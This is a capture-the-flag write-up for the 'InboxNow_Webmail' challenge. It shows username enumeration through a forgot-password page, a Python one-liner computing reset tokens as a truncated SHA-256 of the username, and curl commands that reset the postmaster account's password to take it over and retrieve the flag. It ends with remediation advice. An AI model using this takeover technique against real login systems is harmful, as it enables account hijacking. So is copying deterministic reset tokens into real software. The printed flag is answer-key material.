# InboxNow_Webmail - password-reset token derived from the username alone

| | |
|---|---|
| **Challenge** | InboxNow_Webmail |
| **Category** | AUTH |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://auth11.chal.deti:8070 |
| **Auth weakness** | CWE-640 (weak password recovery) + CWE-330 (no randomness) |
| **Creds given** | user / user123 |

## Hint
> The same key cut twice for a name alone, no clock - it never wears out.

## Recon
- `/forgot` (field `username`) "sends a reset link" - and the page embeds the
  link in a hidden `<div>` (simulating the email):
  `POST /forgot username=user` → `/reset/5444ba88e51dcb9ea2c5`.
- The link only appears for a **valid** username → `/forgot` doubles as a
  **username-enumeration oracle**. `admin`/`administrator` returned nothing;
  sweeping names found **`postmaster`** → `/reset/6011f4ccfed22ac2fc15`.

## Approach
CWE-640/330: the reset token is **deterministic, name-only, no clock, no expiry**:

```
reset_token(username) = sha256("reset:" + username)[:20]
sha256("reset:user")[:20]        = 5444ba88e51dcb9ea2c5   ✅
sha256("reset:postmaster")[:20]  = 6011f4ccfed22ac2fc15   ✅
```

So anyone's reset token is computable from their name. Target the privileged
`postmaster` mailbox: trigger its reset (activates the token / reveals the link),
set a new password via `/reset/<token>`, log in, read the inbox → flag.

## Exploitation
```bash
# derive/confirm the token (or just read it from the /forgot response)
python3 -c 'import hashlib;print(hashlib.sha256(b"reset:postmaster").hexdigest()[:20])'
# -> 6011f4ccfed22ac2fc15

curl -s -d 'username=postmaster' http://auth11.chal.deti:8070/forgot >/dev/null   # activate
curl -s -d 'password=Pwned123!' http://auth11.chal.deti:8070/reset/6011f4ccfed22ac2fc15 >/dev/null
curl -s -c cj.txt -d 'username=postmaster&password=Pwned123!' \
     http://auth11.chal.deti:8070/login -o /dev/null
curl -s -b cj.txt http://auth11.chal.deti:8070/ | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{50ea3f29b29506a1c4b9cb540a62ed3e}
```

## Root cause & remediation
- **Cause:** the password-reset token is a deterministic hash of the username
  (CWE-330) with no secret, no randomness, no expiry (CWE-640), so any account's
  token is trivially computed and reused - full account takeover. `/forgot` also
  leaks account existence.
- **Fix:** generate reset tokens from a CSPRNG, bind them to the account, store
  them server-side hashed, expire them quickly and make them single-use; return
  an identical response whether or not the username exists; never embed the
  reset link in the HTTP response.
